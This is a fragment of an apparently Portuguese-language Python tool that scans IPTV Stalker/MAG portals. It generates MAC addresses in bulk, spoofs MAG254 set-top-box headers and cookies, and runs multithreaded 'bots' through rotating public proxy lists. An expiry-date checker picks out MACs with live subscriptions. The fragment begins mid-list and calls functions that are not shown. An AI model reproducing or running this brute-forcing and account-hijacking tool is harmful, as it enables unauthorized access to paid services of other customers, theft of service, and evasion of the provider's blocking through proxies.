		  "https://raw.githubusercontent.com/JIH4DHoss4in/PROXY-List/main/http.txt",
		  "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
		  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
		  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
		  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
		  "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/http.txt",
		  "https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
		  "https://raw.githubusercontent.com/fahimscirex/proxybd/master/proxylist/http.txt",
		  "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
		  "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
		  "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
		  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
		  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
		  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
		  "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
		  "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt",
		  "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
		  "https://raw.githubusercontent.com/proxylist-to/proxy-list/main/http.txt"]
socks4=["https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
              "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
              "https://api.openproxylist.xyz/socks4.txt",
              "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt"]
socks5=["https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
              "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
              "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
              "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"]
PURPLE = '\033[95m'
CYAN = '\033[96m'
DARKCYAN = '\033[36m'
BLUE = '\033[94m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
END = '\033[0m'
v="1.0b"
os.system('cls' if os.name == 'nt' else 'clear')
def getPrList(prlist):
    prdata=[]
    for api in range(0, len(prlist)-1):
        try:
            data=requests.get(prlist[api]).text.split("\n")
            for i in data:
                if i not in prdata:
                    prdata.append(i)
        except ConnectionError:
            print("Network Error")
            return []
        except KeyboardInterrupt:
            print("Bye!")
            exit()
        except Exception as e:
            print("ERROR :\n"+str(e))
            return []
    if prdata!=[]:
        return prdata
    else:
        return []
def writeToFile(pr="", filename="proxy.txt"):
    file=open(filename,'wb')
    print(pr)
    time.sleep(10)
    file.write(bytes(pr.strip(), 'utf-8'))
def homeMenu():
    os.system("cls" if os.name == "nt" else "clear")
    print(PRL)
    print("""\n    \33[1mONLINE ELITE PROXIES!\n    \33[33m\33[1mTAP = 0 = CONTINUE \n    \33[1;96m\33[1m1 =  HTTPs (Online)-[7000+]\n    \33[1;96m\33[1m2 =  SOCKS4 (Online)-[7500+]\n    \33[1;96m\33[1m3 =  SOCKS5 (Online)-[1000+]\n """)
    httpsProxy=[]
    socks4Proxy=[]
    socks5Proxy=[]
    while True:
        try:
            userInput = input(RED+"Digite sua escolha:    ")
            homeChoice = int(userInput) if userInput.strip() != '' else 0
            if homeChoice==1:
                os.system("cls" if os.name == "nt" else "clear")
                print(PRL)
                print("Obtendo Proxies HTTP!")
                httpsProxy=getPrList(https)
                print(f"Obtido {len(httpsProxy)} Proxies")
                time.sleep(4)
                pr=""
                for i in httpsProxy:
                    pr=pr+"\n"+i
                writeToFile(pr, rootDir+'proxy/ONLINE-HTTPs.txt')
                os.system("cls" if os.name == "nt" else "clear")
                print("Concluído!")
                break
            elif homeChoice==2:
                os.system("cls" if os.name == "nt" else "clear")
                print(PRL)
                print("Obtendo Proxies SOCKS4!")
                socks4Proxy=getPrList(socks4)
                print(f"Obtido {len(socks4Proxy)} Proxies")
                time.sleep(4)
                pr=""
                for i in socks4Proxy:
                    pr=pr+"\n"+i
                writeToFile(pr, rootDir+'proxy/ONLINE-SOCKs4.txt')
                os.system("cls" if os.name == "nt" else "clear")
                print("Concluído!")
                break
            elif homeChoice==3:
                os.system("cls" if os.name == "nt" else "clear")
                print(PRL)
                print("Obtendo Proxies SOCKS5!")
                socks5Proxy=getPrList(socks5)
                print(f"Obtido {len(socks5Proxy)} Proxies")
                time.sleep(4)
                pr=""
                for i in socks5Proxy:
                    pr=pr+"\n"+i
                writeToFile(pr, rootDir+'/proxy/ONLINE-SOCKs5.txt')
                os.system("cls" if os.name == "nt" else "clear")
                print("Concluído!")
                break
            elif homeChoice==0:
                os.system("cls" if os.name == "nt" else "clear")
                break
            else:
                print("Escolha inválida! Tente novamente.\n")
        except ValueError:
            print("Entrada inválida! Tente novamente.\n")
        except KeyboardInterrupt:
            print("Bye!")
            exit()
        except Exception as e:
            os.system("cls" if os.name == "nt" else "clear")
            print("ERROR!")
            print(e)
homeMenu()
StalkerElectronSpeedX()
proxi=input("""\33[0;1;105m
 VOCÊ GOSTARIA DE UTILIZAR PROXY?   \33[0;1m
\33[0;1;105m 1 - SIM \33[0;1m
\33[0;1;105m 2 - NÃO \33[0;1m
\33[0;1;105m RESPONDA 1 ~ 2 = \33[0;1m\33[1;38;5;215m""")
if proxi =="1":
	print(statusproxy)
	dosyasec()
	pro=input("""\033[0;91m
Selecione o tipo de Proxy?
	1 - ipVanish
	2 - Socks4
	3 - Socks5
	4 - Http/Https
Tipo de Proxy =""")
print(proxyuz)
botgir=input("""\033[0;94m
Número de Bots?
[33mᴘᴀᴅʀᴀ̃ᴏ ᴇ́ = 5
Bots =""")
if botgir=="":
	botgir=5
proxysay=0
pattern= "(\\w{2}:\\w{2}:\\w{2}:\\w{2}:\\w{2}:\\w{2})"
os.system("cls" if os.name == "nt" else "clear")
print(PRL)
m3ushort = input("""   [1;96mQual link M3U você deseja? \n[0m
\n   1 [35m= [0m[33mURL Real (M3U) [0m
\n   2 [36m= [0m[33mSomente M3U Curto [0m
\n   [33mᴘᴀᴅʀᴀ̃ᴏ ᴇ́ = 1 [0m[36m
\n   [32mResposta = [0m[0m[0m""")
if not m3ushort == '2':
    m3ushort = '1'
os.system("cls" if os.name == "nt" else "clear")
print(PRL)
facestb = input("""[0;1m   Selecione a Aparência da Configuração! \n[0m
   [33mᴘᴀᴅʀᴀ̃ᴏ ᴇ́ = 1 \n[0m
[36m
   1 = Normal ULTIMAX IP CLOUDFLARE [32m
     ╙[Mais Estáveis Hits]
[36m
   2 = Mais Rápido ULTIMAX IP CLOUDFLARE  [94m
     ╙[Menos Estáveis Hits]
[0m
[31m   Resposta = [0m[0m[0m""")
k=0
jj=0
iii=0
genmacs=""
bib=0
def randommac():
	global genmacs,combosay
	combosay=combosay+1
	global k,jj,iii
	if randomturu == '2':
		while True:
			genmac = str(mactur)+"%02X:%02X:%02X"% ((random.randint(0, 256)),(random.randint(0, 256)),(random.randint(0, 256)))
			if not genmac in genmacs:
				genmacs=genmacs + ' '
				break
	else:
		if iii >= 257:
			iii=0
			jj=jj+1
		if jj >= 257:
			if not len(seri)==2:
				jj=0
			k=k+1
			if len(seri)==2:
				quit()
		if k==257:
			quit()
		genmac = str(mactur)+"%02X:%02X:%02X"% (k,jj,iii)
		iii=iii+1
	if serim=="1":
	   if len(seri) ==1:
	   	genmac=str(genmac).replace(str(genmac[:10]),str(mactur)+seri)
	   if len(seri)==2:
	   	genmac=str(genmac).replace(str(genmac[:11]),str(mactur)+seri)
	genmac=genmac.replace(':100',':10')
	genmac=genmac.upper()
	return genmac
def hea1(panel,mac):
	macs=mac.upper()
	macs=urllib.parse.quote(mac)
	panell=panel
	if uzmanm=="stalker_portal/server/load.php":
		panell=str(panel)+'/stalker_portal'
	data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
	}
	if uzmanm=="stalker_portal/server/load.php":
		data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
		}
	if uzmanm=="stalker_portal/server/load.php":
		if stalker_portal=="1":
			data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis; adid=2aedad3689e60c66185a2c7febb1f918",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
			}
	return data
def hea2(mac,token):
	macs=mac.upper()
	macs=urllib.parse.quote(mac)
	panell=panel
	if uzmanm=="stalker_portal/server/load.php":
		panell=str(panel)+'/stalker_portal'
	data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+str(token),
	}
	if uzmanm=="stalker_portal/server/load.php":
		data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+str(token),
		}
	if uzmanm=="stalker_portal/server/load.php":
		if stalker_portal=="1":
			data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis; adid=2aedad3689e60c66185a2c7febb1f918",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+str(token),
			}
	return data
def month_string_to_number(ay):
    m = {
        'jan': 1,
        'feb': 2,
        'mar': 3,
        'apr': 4,
        'may': 5,
        'jun': 6,
        'jul': 7,
        'aug': 8,
        'sep': 9,
        'oct': 10,
        'nov': 11,
        'dec': 12
    }
    s = ay.strip()[:3].lower()
    try:
        out = m[s]
        return out
    except KeyError:
        raise ValueError('Not a valid month')
def tarih_clear(trh):
    ay = gun = yil = trai = my_date = sontrh = out = ''
    ay = str(trh.split(' ')[0])
    gun = str(trh.split(', ')[0].split(' ')[1])
    yil = str(trh.split(', ')[1])
    ay = str(month_string_to_number(ay))
    formatted_date = f"{gun.zfill(2)}/{ay.zfill(2)}/{yil}"
    trai = formatted_date
    d = date(int(yil), int(ay), int(gun))
    sontrh = time.mktime(d.timetuple())
    out = int((sontrh - time.time()) / 86400)
    return trai, out
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"
ses=requests.Session()
os.system('cls' if os.name == 'nt' else 'clear')
ban = speed = buri = urib = uzmanc = uzmanm2 = ""
uzmanm="portal.php"
hostserver2=panel
hostserver2=hostserver2.split(":")[0]
try:
    ipserv2 = socket.gethostbyname(hostserver2)
    countryserv = requests.get('https://freegeoip.app/json/' + ipserv2)
    veri2 = str(countryserv.text)
    countryserv = veri2.split('country_name":"')[1]
    countryserv = countryserv.split('"')[0]
    codeserv2 = veri2.split('country_code":"')[1]
    codeserv2 = codeserv2.split('"')[0]
    country = pycountry.countries.get(alpha_2=codeserv2)
    flagserv2 = country.flag
    servisp = requests.get('https://ipleak.net/json/' + ipserv2)
    verisp = str(servisp.text)
    servisp = verisp.split('isp_name": "')[1]
    servisp = servisp.split('"')[0]
    if servisp == "CLOUDFLARENET":
        cloud = " 𝘊𝘓𝘖𝘜𝘋𝘍𝘓𝘈𝘙𝘌 ❗"
    else:
        cloud = ""
except:
    print("""
""")
publicip=requests.get('https://api.ipify.org')
publicip=(publicip.text)
clientipcheck=requests.get('https://reallyfreegeoip.org/json/'+publicip)
connectioncheck=requests.get('https://api.findip.net/'+publicip+'/?token=0f79cd885d1544e9ae6243fc61c68093')
veri3=str(clientipcheck.text)
veri44=str(connectioncheck.text)
clientcountry=veri3.split('country_name":"')[1]
clientcountry=clientcountry.split('"')[0]
codeserv3=veri3.split('country_code":"')[1]
codeserv3=codeserv3.split('"')[0]
country3 = pycountry.countries.get(alpha_2=codeserv3)
flagserv3 = country3.flag
connection_types=veri44.split('connection_type":"')[1]
connection_types=connection_types.split('"')[0]
if connection_types=="Corporate":
	connection_types="Vpn "
if connection_types=="Cellular":
	connection_types="Cellular "
if connection_types=="Cable/DSL":
	connection_types="Cable/DSL "
useragent="ok http"
realblue=""
uzmanuse="ƈųʂɬơɱ"
os.system('cls' if os.name == 'nt' else 'clear')
combosay=0
def combogetir():
	combogeti=""
	global combosay
	combosay=combosay+1
	try:
		combogeti=(combototLen[combosay])
	except:pass
	return combogeti
def check_expiry(end_date, current_mac):
    global exp, last_good_date, last_good_mac, last_bad_date, last_bad_mac
    try:
        if "Unlimited" in end_date or end_date == "":
            exp = exp + 1
            last_good_date = "Unlimited"
            last_good_mac = current_mac
            return True
        if "2025" in end_date:
            last_good_date = end_date
            last_good_mac = current_mac
            return True
        if "October" in end_date and "2024" in end_date:
            if int(end_date.split()[1].replace(',', '')) > 31:
                last_good_date = end_date
                last_good_mac = current_mac
                return True
            else:
                last_bad_date = end_date
                last_bad_mac = current_mac
                return False
        if ("November" in end_date or "December" in end_date) and "2024" in end_date:
            try:
                date_obj = datetime.strptime(end_date, "%B %d, %Y")
                current_date = datetime.now()
                if date_obj > current_date:
                    last_good_date = end_date
                    last_good_mac = current_mac
                    return True
                else:
                    last_bad_date = end_date
                    last_bad_mac = current_mac
                    return False
            except ValueError:
                last_bad_date = end_date
                last_bad_mac = current_mac
                return False
        last_bad_date = end_date
        last_bad_mac = current_mac
        return False
    except Exception as e:
        print("Erro na data: " + str(e) + " para " + str(end_date))
        return False
def proxygetir():
	if proxi =="1":
		global proxysay,bib
		bib=bib+1
		bekle(bib,"xdeep")
		if bib==15:
			bib=0
		while True:
			try:
				proxysay=proxysay+1
				if proxysay==proxyuz:
					proxysay=0
				proxygeti=(proxytotLen[proxysay])
				pveri=proxygeti.replace('\n','')
				pip=pveri.split(':')[0]
				pport=pveri.split(':')[1]
				if pro=="1":
					pname=pveri.split(':')[2]
					ppass=pveri.split(':')[3]
					proxies={'http':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport,'https':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport}
				if pro=="2":
					proxies={'http':'socks4://'+pip+':'+pport,'https':'socks4://'+pip+':'+pport}
				if pro=="3":
					proxies={'http':'socks5://'+pip+':'+pport,'https':'socks5://'+pip+':'+pport}
				if pro=="4":
					proxies={'http':'http://'+pip+':'+pport,'https':'https://'+pip+':'+pport}
				break
			except:pass
	else:
		proxies=""
	return proxies
for xdeep in range(int(botgir)):
	XDeep = threading.Thread(target=XD)
	XDeep.start()
